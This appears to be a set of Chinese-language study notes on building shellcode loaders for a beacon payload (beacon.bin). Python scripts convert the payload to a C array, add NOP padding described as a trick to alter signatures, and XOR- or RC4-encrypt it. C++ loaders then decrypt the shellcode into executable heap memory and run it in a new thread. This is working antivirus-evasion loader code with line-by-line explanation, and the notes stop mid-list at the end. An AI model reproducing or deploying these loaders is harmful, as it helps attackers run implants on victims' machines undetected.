### 将beacon二进制转换成C数组
利用python，示例代码如下
```python
def read_binary_file(filename):
    with open(filename, "rb") as file:
         return file.read()
         
def generate_c_array(data):
    nop = "\t0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,"
    c_array = ""
    for i, byte in enumerate(data):
        if i % 100 == 0:
            c_array += "\n"
            c_array += "\t"
        c_array += f"0x{byte:02X}, "
    c_array = c_array.rstrip(", ") # 移除最后⼀个逗号和空格
    return "{"+nop+c_array+"\n};"

def main():
    # 读取⼆进制⽂件
    filename = "beacon.bin"
    binary_data = read_binary_file(filename)
    # ⽣成C格式的数组
    c_array = generate_c_array(binary_data)
    # 将结果输出到⽂件
    output_filename = "res.txt"
    with open(output_filename, "w") as file:
        file.write(c_array)

if __name__ == "__main__":
 main()
```
#### 代码解释
##### `read_binary_file(filename)` 函数
```python
def read_binary_file(filename):
    with open(filename, "rb") as file:
         return file.read()
```
- **功能**: 读取指定文件名的二进制文件，并返回文件内容。
- **参数**:   
    - `filename`: 要读取的二进制文件的文件名。     
- **返回值**: 返回文件的二进制内容（`bytes` 类型）。    
- **解释**: 
    - `open(filename, "rb")`: 以二进制模式（`"rb"`）打开文件。      
    - `file.read()`: 读取文件的全部内容并返回。

#####  `generate_c_array(data)` 函数
```python
def generate_c_array(data):
    nop = "\t0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,"
    c_array = ""
    for i, byte in enumerate(data):
        if i % 100 == 0:
            c_array += "\n"
            c_array += "\t"
        c_array += f"0x{byte:02X}, "
    c_array = c_array.rstrip(", ") # 移除最后⼀个逗号和空格
    return "{"+nop+c_array+"\n};"
```
- **功能**: 将二进制数据转换为C语言格式的数组。  
- **参数**:    
    - `data`: 二进制数据（`bytes` 类型）。    
- **返回值**: 返回一个C语言格式的数组字符串。   
- **解释**:
    - `nop`: 这是一个固定的NOP指令（`0x90`）的数组片段，用于在生成的C数组开头插入一些NOP指令。(<mark style="background: #FF5582A6;">就是一种花指令改变特征码的小方法</mark>)    
    - `c_array`: 用于存储生成的C数组字符串。    
    - `for i, byte in enumerate(data)`: 遍历二进制数据的每一个字节。    
        - `if i % 100 == 0`: 每处理100个字节后，换行并添加一个制表符（`\t`），以便生成的数组更易读。        
        - `c_array += f"0x{byte:02X}, "`: 将每个字节转换为十六进制格式（`0xXX`），并添加到`c_array`中。          
    - `c_array = c_array.rstrip(", ")`: 移除最后一个逗号和空格，确保数组格式正确。    
    - `return "{"+nop+c_array+"\n};"`: 将生成的数组片段与NOP指令组合，并返回完整的C数组字符串。

#####  `main()` 函数
```python
def main():
    # 读取⼆进制⽂件
    filename = "beacon.bin"
    binary_data = read_binary_file(filename)
    # ⽣成C格式的数组
    c_array = generate_c_array(binary_data)
    # 将结果输出到⽂件
    output_filename = "res.txt"
    with open(output_filename, "w") as file:
        file.write(c_array)
```
- **功能**: 主函数，负责读取二进制文件、生成C数组并将结果写入输出文件。
- **解释**:
    - `filename = "beacon.bin"`: 指定要读取的二进制文件名。    
    - `binary_data = read_binary_file(filename)`: 调用`read_binary_file`函数读取二进制文件内容。    
    - `c_array = generate_c_array(binary_data)`: 调用`generate_c_array`函数将二进制数据转换为C数组字符串。    
    - `output_filename = "res.txt"`: 指定输出文件名。    
    - `with open(output_filename, "w") as file`: 以写入模式打开输出文件。    
    - `file.write(c_array)`: 将生成的C数组字符串写入输出文件。

##### `if __name__ == "__main__":` 语句
- **功能**: 确保只有在直接运行该脚本时才会执行`main()`函数    
- **解释**:
    - 当脚本作为主程序运行时，`__name__` 变量的值为 `"__main__"`，此时会调用 `main()` 函数。    
    - 如果脚本被作为模块导入到其他脚本中，`__name__` 的值将不是 `"__main__"`，因此不会执行 `main()` 函数。


### 异或处理（XOR加密）
#### 数字型异或
```python
def read_binary_file(filename):
    with open(filename, "rb") as file:
        return file.read()

def xor_data(data, key):
    return bytes(byte ^ key for byte in data)

def generate_c_array(data):
    nop = "\t0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,"
    c_array = ""
    for i, byte in enumerate(data):
       if i % 100 == 0:
           c_array += "\n"
           c_array += "\t"
       c_array += f"0x{byte:02X}, "
    c_array = c_array.rstrip(", ") # 移除最后⼀个逗号和空格
    return "{"+nop+c_array+"\n};"

def main():
    # 读取⼆进制⽂件
    filename = "beacon.bin"
    binary_data = read_binary_file(filename)
    # 异或处理数据
    xor_key = 77
    xor_result = xor_data(binary_data, xor_key)
    # ⽣成C格式的数组
    c_array = generate_c_array(xor_result)
    # 将结果输出到⽂件
    output_filename = "res.txt"
    with open(output_filename, "w") as file:
        file.write(c_array)
if __name__ == "__main__":
    main()
```

上述代码只是在原有二进制处理成c数组基础上进行数字型的异或运算
读取完文件之后先进行数字的异或运算（由于异或是二进制运算）

#### XOR函数
##### `XOR_date()`函数
```python
def xor_data(data, key):
    return bytes(byte ^ key for byte in data)
```
 **`byte ^ key for byte in data`**:   
    - 这是一个生成器表达式，遍历 `data` 中的每一个字节（`byte`）。    
    - 对每个字节与 `key` 进行按位异或操作（`^`）。    
    - 异或操作的性质：    
        - 如果 `byte ^ key` 的结果是加密操作，那么再次对结果进行 `^ key` 操作会恢复原始数据（即解密）。        
        - 例如：`(byte ^ key) ^ key = byte`。        
 **`bytes(...)`**:
    - 将生成器表达式的结果转换为 `bytes` 类型。    
    - 因为生成器表达式返回的是一个迭代器，`bytes()` 函数将其转换为字节序列。

```python
xor_key = 77
    xor_result = xor_data(binary_data, xor_key)
```
该语句只是添加到主函数中以执行数字异或运算，先指定了异或的数字，然后运行函数
异或运算的数字可以随意指定

#### 解密执行
由于解密是pe文件执行所以采用C++解密
```C++
#include <Windows.h>
// 异或解密函数的实现

void xorDecrypt(unsigned char* data, size_t size, unsigned char key)
{
    for (size_t i = 0; i < size; ++i)
        {
            data[i] ^= key;
        }
}

int main()
{
    // 加密的Shellcode
    unsigned char encryptedShellcode[] = {0xdd};
    // 计算Shellcode的⼤⼩
    size_t shellcodeSize = sizeof(encryptedShellcode) - 1; // 减去字符串结尾的空字符
    // 解密Shellcode
    xorDecrypt(encryptedShellcode, shellcodeSize, 77);
    // 分配可执⾏内存
    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
    PVOID pShellcode = HeapAlloc(hHeap, 0, shellcodeSize);
    RtlCopyMemory(pShellcode, encryptedShellcode, shellcodeSize);
    // 创建线程执⾏Shellcode
    DWORD dwThreadId = 0;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, &dwThreadId);
    WaitForSingleObject(hThread, INFINITE);
    // 清理资源
    HeapFree(hHeap, 0, pShellcode);
    CloseHandle(hThread);
    HeapDestroy(hHeap);
    return 0;
}
```

##### 头文件引入
```c++
#include <Windows.h>
```
- **作用**: 引入Windows API的头文件，以便使用Windows系统提供的函数和数据类型（如`HANDLE`, `HeapCreate`, `CreateThread`等）。

##### 异或解密函数
```c++
void xorDecrypt(unsigned char* data, size_t size, unsigned char key)
{
    for (size_t i = 0; i < size; ++i)
    {
        data[i] ^= key;
    }
}
```
- **功能**: 对输入的二进制数据进行异或解密。
- **参数**:    
    - `data`: 指向需要解密的二进制数据的指针。      
    - `size`: 数据的大小（字节数）。    
    - `key`: 异或解密的密钥（单字节）。    
- **逻辑**:
    - 遍历数据的每个字节，将其与密钥进行异或操作（`^=`）。    
    - 异或操作的性质：`(data[i] ^ key) ^ key = data[i]`，因此可以通过相同的密钥恢复原始数据。

##### main函数
###### 定义加密的shellcode
```c++
unsigned char encryptedShellcode[] = {0xdd};
```
- **作用**: 定义一个加密的Shellcode数组。
- **说明**:  
    - `encryptedShellcode` 是加密后的Shellcode数据。      
    - 这里只包含一个字节 `0xdd`，实际使用时需要替换为完整的加密Shellcode。

###### 计算shellcode的大小
```c++
size_t shellcodeSize = sizeof(encryptedShellcode) - 1; // 减去字符串结尾的空字符
```
- **作用**: 计算Shellcode的大小。  
- **说明**:
    - `sizeof(encryptedShellcode)` 返回数组的总大小（字节数）。    
    - 如果Shellcode是以字符串形式定义的，末尾会有一个空字符（`\0`），需要减去1。    
    - 这里 `encryptedShellcode` 是一个字节数组，没有空字符，因此 `-1` 是不必要的。

###### 解密shellcode
```c++
xorDecrypt(encryptedShellcode, shellcodeSize, 77);
```
- **作用**: 调用 `xorDecrypt` 函数对Shellcode进行解密。
- **参数**:
    - `encryptedShellcode`: 加密的Shellcode数据。    
    - `shellcodeSize`: Shellcode的大小。    
    - `77`: 解密密钥。        
- **说明**:
    - 解密后的Shellcode会直接存储在 `encryptedShellcode` 数组中。

<mark style="background: #FF5582A6;">剩下的代码就是申请内存，复制shellcode到内存中，加载shellcode，清理申请的资源后续单独整理
所以，是先解密完成之后形成完整的c数组之后再去执行加载过程</mark>


### RC4加密
```python
from Crypto.Cipher import ARC4

def encrypt_rc4(key, data):
    cipher = ARC4.new(key)
    encrypted_data = cipher.encrypt(data)
    return encrypted_data  
    
def generate_c_array(data):
    c_array = ""
    for i, byte in enumerate(data):
        if i % 100 == 0 and i != 0:
           c_array += "\n"
           c_array += "\t"
        c_array += f"{hex(byte)}, "
    return "{\t"+c_array+"\n};"  

def write_to_file(filename, content):
    with open(filename, "w") as file:
        file.write(content)
# 读取⽂件
with open("beacon.bin", "rb") as file:
    beacon_data = file.read()

def main():
    # RC4加密
    key = b"YourKey"
    encrypted_data = encrypt_rc4(key, beacon_data)
    # ⽣成C格式数组
    c_array = generate_c_array(encrypted_data)
    # 写⼊⽂件
    write_to_file("res.txt", c_array)

if __name__ == "__main__":
    main()
```
这段代码的主要功能是读取一个二进制文件（`beacon.bin`），使用RC4算法对其进行加密，然后将加密后的数据转换为C语言格式的数组，并将结果写入一个文本文件（`res.txt`）
所以是在上述beacon二进制转换成c数组的基础上加了RC4加密过程

#### 导入模块
```python
from Crypto.Cipher import ARC4
```
- **作用**: 从 `Crypto.Cipher` 模块中导入 `ARC4` 类，用于实现RC4加密算法。  
- **说明**:    
    - `ARC4` 是一种流加密算法，适用于对数据进行快速加密和解密。

#### RC4加密函数
```python
def encrypt_rc4(key, data):
    cipher = ARC4.new(key)
    encrypted_data = cipher.encrypt(data)
    return encrypted_data 
```
- **功能**: 使用RC4算法对数据进行加密。
- **参数**:
    - `key`: 加密密钥（字节类型）。    
    - `data`: 需要加密的数据（字节类型）。    
- **返回值**: 返回加密后的数据（字节类型）。
- **逻辑**    
    - `ARC4.new(key)`: 使用密钥创建一个RC4加密器对象。    
    - `cipher.encrypt(data)`: 对输入数据进行加密，并返回加密后的结果。

#### 二进制转换成C数组函数
```python
def generate_c_array(data):
    c_array = ""
    for i, byte in enumerate(data):
        if i % 100 == 0 and i != 0:
           c_array += "\n"
           c_array += "\t"
        c_array += f"{hex(byte)}, "
    return "{\t"+c_array+"\n};"
```
- **功能**: 将二进制数据转换为C语言格式的数组。
- **参数**:
    - `data`: 需要转换的二进制数据（字节类型）。      
- **返回值**: <mark style="background: #FF5582A6;">返回一个C语言格式的数组字符串。最后也是十六进制的字符串数组</mark>
- **逻辑**:
    - 遍历数据的每个字节，将其转换为十六进制格式（`hex(byte)`）。   
    - 每100个字节换行，并添加一个制表符（`\t`），以提高可读性。    
    - 最后将结果格式化为C语言数组的形式（`{ ... };`）。

#### 写入指定文件中
```python
def write_to_file(filename, content):
    with open(filename, "w") as file:
        file.write(content)
```
- **功能**: 将内容写入指定文件。
- **参数**:
    - `filename`: 目标文件名。    
    - `content`: 需要写入的内容（字符串类型）。    
- **逻辑**:    
    - 以写入模式（`"w"`）打开文件，并将内容写入文件。

#### 读取文件
```python
with open("beacon.bin", "rb") as file:
    beacon_data = file.read()
```
- **功能**: 读取二进制文件 `beacon.bin` 的内容。    
- **逻辑**:
    - 以二进制模式（`"rb"`）打开文件，并使用 `file.read()` 读取文件的全部内容。    
    - 文件内容存储在 `beacon_data` 变量中（字节类型）。

#### mian函数
```python
def main():
    # RC4加密
    key = b"YourKey"
    encrypted_data = encrypt_rc4(key, beacon_data)
    # ⽣成C格式数组
    c_array = generate_c_array(encrypted_data)
    # 写⼊⽂件
    write_to_file("res.txt", c_array)
```
- **功能**: 主函数，负责调用其他函数完成加密、格式转换和文件写入操作。
- **逻辑**    
    1. **RC4加密**:    
        - 使用密钥 `b"YourKey"` 对 `beacon_data` 进行加密，得到 `encrypted_data`。       
    2. **生成C格式数组**:    
        - 调用 `generate_c_array` 函数，将加密后的数据转换为C语言格式的数组字符串。        
    3. **写入文件**:
        - 调用 `write_to_file` 函数，将C格式数组写入 `res.txt` 文件。


#### 代码执行流程
<mark style="background: #FF5582A6;">代码是先读取beacon中的二进制内容，之后在去对二进制进行RC4的加密，然后是将二进制转换成C数组，最后将数组写入文件中。
可见XOR还是RC4所有的加密和编码都是对二进制文件进行的。</mark>

#### 导入依赖
需要使用固定的库
对于py来讲可以直接使用pip命令安装库，pip工具会自动将库安装到py环境包中
```shell
pip install pycryptodome
```


### RC4解密
```c++
#include <Windows.h>
#include "rc4.h"

int main()
{
    char key[] = "YourKey";
    unsigned char encrypted_shellcode[] = "encrypted_shellcode";
    int encrypted_shellcode_len = sizeof(encrypted_shellcode) - 1;

    unsigned char S[N] = { 0 };
    KSA(key, S);
    PRGA(S, reinterpret_cast<char*>(encrypted_shellcode),
    encrypted_shellcode_len);

    HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
    PVOID Mptr = HeapAlloc(hHep, 0, encrypted_shellcode_len);
    RtlCopyMemory(Mptr, encrypted_shellcode, encrypted_shellcode_len);
    
    DWORD dwThreadId = 0;
    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, NULL, &dwThreadId);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

#### main函数
##### 定义密钥和加密的shellcode
```c++
char key[] = "YourKey";
unsigned char encrypted_shellcode[] = "encrypted_shellcode";
int encrypted_shellcode_len = sizeof(encrypted_shellcode) - 1;
```
- **作用**: 定义RC4解密的密钥和加密的Shellcode。
- **说明**:   
    - `key`: 解密密钥，类型为字符串（`char[]`）。    
    - `encrypted_shellcode`: 加密的Shellcode，类型为字节数组（`unsigned char[]`）。    
    - `encrypted_shellcode_len`: 计算加密Shellcode的长度（减去字符串末尾的空字符 `\0`）。

##### RC4解密
```c++
unsigned char S[N] = { 0 };
KSA(key, S);
PRGA(S, reinterpret_cast<char*>(encrypted_shellcode), encrypted_shellcode_len);
```
- **作用**: 使用RC4算法对加密的Shellcode进行解密。
- **逻辑**:
    1. **初始化状态数组 `S`**:    
        - `unsigned char S[N] = { 0 };`: 定义一个大小为 `N` 的状态数组 `S`，并初始化为0。     `N` 是RC4算法中状态数组的大小，通常为256。        
    2. **密钥调度算法（KSA）**:    
        - `KSA(key, S);`: 使用密钥 `key` 初始化状态数组 `S`。        
    3. **伪随机生成算法（PRGA）**:
        - `PRGA(S, reinterpret_cast<char*>(encrypted_shellcode), encrypted_shellcode_len);`: 使用状态数组 `S` 对加密的Shellcode进行解密。    
        - `reinterpret_cast<char*>(encrypted_shellcode)`: 将 `unsigned char*` 强制转换为 `char*`，以便与 `PRGA` 函数的参数类型匹配。

剩下部分就是申请内存，复制shellcode到内存，执行shellcode

#### 代码执行流程
1. **定义密钥和加密的Shellcode**:
    - 密钥为 `"YourKey"`，加密的Shellcode为 `"encrypted_shellcode"`。    
2. **RC4解密**:
    - 使用密钥对加密的Shellcode进行解密。    
3. **分配可执行内存**:
    - 创建堆并分配可执行内存        
4. **复制Shellcode到内存**:
    - 将解密后的Shellcode复制到可执行内存中。
5. **执行Shellcode**:
    - 创建线程执行Shellcode，并等待线程结束。
6. **程序退出**:
    - 返回0，程序正常退出。‘

#### 注意
1--rc4.h是自己写的头文件，注意位置放在哪里，再叠加其他加密方式之后头文件需要改变吗，不需要更改头文件，只要叠加加密方式即可。
2--